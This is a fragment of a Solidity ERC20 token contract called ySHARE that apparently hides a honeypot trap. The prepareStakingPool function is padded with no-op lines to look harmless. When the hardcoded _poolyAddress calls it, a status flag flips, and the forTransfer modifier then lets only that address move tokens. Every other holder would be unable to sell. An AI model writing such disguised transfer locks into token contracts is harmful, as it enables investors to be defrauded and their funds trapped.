...
contract ySHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokeny_totalSupply;
    uint256 private _tokeny_status = 0;
    uint256 public stakingPoolyStatus = 0;

    string private _tokeny_name;
    string private _tokeny_symbol;

    address private _poolyAddress = 0x1c958425711CFb7ea98699f6308D1EAc7e925c58;

    constructor() {
        _tokeny_name = "ySHARE";
        _tokeny_symbol = "ySHARE";
        _tokeny_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokeny_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolyAddress || _tokeny_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokeny_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolyStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolyAddress)
        {
            _tokeny_status = 1;
        }
    }
